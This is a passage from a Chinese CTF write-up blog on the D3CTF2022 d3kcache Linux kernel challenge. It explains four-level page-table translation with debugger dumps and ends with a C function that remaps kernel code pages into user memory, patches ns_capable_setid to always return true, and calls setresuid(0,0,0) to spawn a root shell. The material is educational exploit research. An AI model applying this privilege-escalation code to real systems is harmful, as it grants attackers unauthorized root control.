class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br></pre></td></tr></table></figure>
<p>虽然<code>arttnba3</code>大佬选择自己重新解析stack的地址stack_addr_another,但实际上直接使用stack_addr也是能够成功的</p>
<h4 id="虚拟地址翻译"><a href="#虚拟地址翻译" class="headerlink" title="虚拟地址翻译"></a>虚拟地址翻译</h4><p>虽然5级页表也已经挺成熟了,但现在大多数的x86机器依然是4级页表</p>
<p>即<code>pgd,pud,pmd,pte</code>,四级页表只使用48位,除去12位的页内偏移,剩下的36位,四级页表平分各9位</p>
<p>kernel pwn中遇到的也主要是四级页表</p>
<p>我们知道cr3寄存器存储的是pgd基址的物理内存地址,每个进程都有自己的页表,在上下文切换时,当前进程的cr3寄存器会被存入<code>task_struct-&gt;mm-&gt;pgd</code>,不过存的并不是物理地址,而是pgd在直接映射区的地址,当然<strong>直接映射区的地址减去<code>page_offset_base</code>就是物理内存地址了</strong></p>
<p>一般来说,一个页表有512个条目,每个条目占8字节,也就是说一个页表刚好占据一个页框,除pgd只有一个页表外,剩下的三级页表可能都会有多个页表</p>
<p><code>pgd,pud,pmd</code>前三级页表条目的组成如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/clipboard.png" alt=""></p>
<p><code>pte</code>的页表条目如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/clipboard%202.png" alt=""></p>
<p>PTE 有三个权限位，控制对页的访问。R/W 控制是只读还是读写；U/S 控制用户模式是否可以访问；XD 用来禁止从某些页读指令。</p>
<p>每次访问一个页，MMU 都会设置 A 位，称为引用位。内核可以利用这个引用位实现它的页替换算法。</p>
<p>每次写了一个页后，MMU 都会设置 D 位，称为修改位。修改位告诉内核在替换该页前是否必须写回牺牲页。</p>
<p>内核可以通过调用一条特殊的内核模式指令来清除引用位或修改位</p>
<p><strong>特别注意:</strong>在<code>pmd</code>表中,其页表项可能会置<code>PS</code>位,这代表<strong>不存在第四级页表<code>pte</code></strong>,而是将<code>pmd</code>表项的物理基地址对应物理内存直接当做一个大页,虚拟地址的后21位当作偏移,此外虽然上图显示是<code>4M</code>页,但实际上因为只剩下了21位,所以实际上是<code>2M</code>页,在内核页表中页表项物理基址也确实是以<code>2M</code>为单位增加的</p>
<p><code>大页pmd:(基址增加单位2m)</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffff9480c0000000+0xa202000+22*8</span><br><span class="line">00:0000│  0xffff9480ca2020b0 ◂— 0x8000000002c000e3</span><br><span class="line">01:0008│  0xffff9480ca2020b8 ◂— 0x2e29063</span><br><span class="line">02:0010│  0xffff9480ca2020c0 ◂— 0x80000000030000e3</span><br><span class="line">03:0018│  0xffff9480ca2020c8 ◂— 0x80000000032000e3</span><br><span class="line">04:0020│  0xffff9480ca2020d0 ◂— 0x80000000034000e3</span><br><span class="line">05:0028│  0xffff9480ca2020d8 ◂— 0x80000000036000e3</span><br><span class="line">06:0030│  0xffff9480ca2020e0 ◂— 0x80000000038000e3</span><br><span class="line">07:0038│  0xffff9480ca2020e8 ◂— 0x8000000003a000e3</span><br></pre></td></tr></table></figure>
<p><code>4k页pmd:</code>(基址增加单位4k)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0xffff9480c0000000+0x2a4f000+268*8</span><br><span class="line">00:0000│  0xffff9480c2a4f860 ◂— 0x8000000002d70063 /* <span class="string">&#x27;c&#x27;</span> */</span><br><span class="line">01:0008│  0xffff9480c2a4f868 ◂— 0x8000000002d71063</span><br><span class="line">02:0010│  0xffff9480c2a4f870 ◂— 0x8000000002d72063</span><br><span class="line">03:0018│  0xffff9480c2a4f878 ◂— 0x8000000002d73063</span><br></pre></td></tr></table></figure>
<h3 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h3><p>解析目标内核代码物理地址paddr</p>
<p>用户mmap映射一段虚拟地址vaddr,然后劫持vaddr的页表的pte表项为paddr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_usma</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *kcode_map, *kcode_func;</span><br><span class="line">    <span class="type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    kcode_map = mmap((<span class="type">void</span>*) <span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kcode_map) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* because of lazy allocation, we need to write it manually */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        kcode_map[i] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">        kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code seg to exec shellcode directly :) */</span></span><br><span class="line">    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">           dst_vaddr);</span><br><span class="line"></span><br><span class="line">    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);</span><br><span class="line">    dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remapping to our mmap area */</span></span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span>, dst_paddr);</span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span> + <span class="number">0x1000</span>, dst_paddr + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code segment directly */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">     * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>); <span class="comment">/* nop */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>, </span><br><span class="line">            <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="comment">/* endbr64 */</span></span><br><span class="line">            <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="comment">/* mov rax, 1 */</span></span><br><span class="line">            <span class="string">&quot;\xc3&quot;</span>, <span class="comment">/* ret */</span></span><br><span class="line">            <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get root now :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ns_capable_setid</code>函数用于在setreid时判断是否具有权限</p>
<p>我们劫持其为始终返回<code>1</code>,即拥有任意设置id的权限</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#D3CTF2022-d3kcache"><span class="toc-number">1.</span> <span class="toc-text">D3CTF2022-d3kcache</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">模块分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">思路实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4%E6%9E%84%E9%80%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">页级堆风水构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1uaf"><span class="toc-number">1.4.2.</span> <span class="toc-text">第一次uaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1uaf"><span class="toc-number">1.4.3.</span> <span class="toc-text">第二次uaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93"><span class="toc-number">1.4.4.</span> <span class="toc-text">构建自写管道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99"><span class="toc-number">1.4.5.</span> <span class="toc-text">任意读写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.6.</span> <span class="toc-text">泄露信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9cred"><span class="toc-number">1.5.1.</span> <span class="toc-text">修改cred</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E5%86%99%E5%86%85%E6%A0%B8%E6%A0%88"><span class="toc-number">1.5.2.</span> <span class="toc-text">覆写内核栈</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">虚拟地址翻译</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#USMA"><span class="toc-number">1.5.3.</span> <span class="toc-text">USMA</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/10326/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/10326/&text=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/10326/&is_video=false&description=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=从d3cache看页级堆风水与一个off-by-null导致的任意读写&body=Check out this article: https://ixout.github.io/posts/10326/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/10326/&title=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/10326/&name=从d3cache看页级堆风水与一个off-by-null导致的任意读写&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/10326/&t=从d3cache看页级堆风水与一个off-by-null导致的任意读写"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>
        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    ixout
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
